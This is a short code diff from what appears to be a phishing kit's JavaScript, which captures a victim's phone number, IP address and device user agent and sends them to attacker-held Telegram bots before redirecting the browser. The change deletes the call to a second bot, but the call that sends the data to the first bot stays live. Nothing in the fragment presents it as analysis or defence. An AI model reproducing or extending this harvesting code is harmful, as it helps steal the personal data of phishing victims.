@@ -116,7 +116,6 @@ DEVICE INFORMATION      : ${ua}
                 // Send data to both bots
                 try {
                     await sendDataToTelegram(phoneNumber, ip, ua, botToken1, chatId1);
-                    await sendDataToTelegram(phoneNumber, ip, ua, botToken2, chatId2);
 
                     // Redirect to next page after 5 seconds
                     setTimeout(() => {
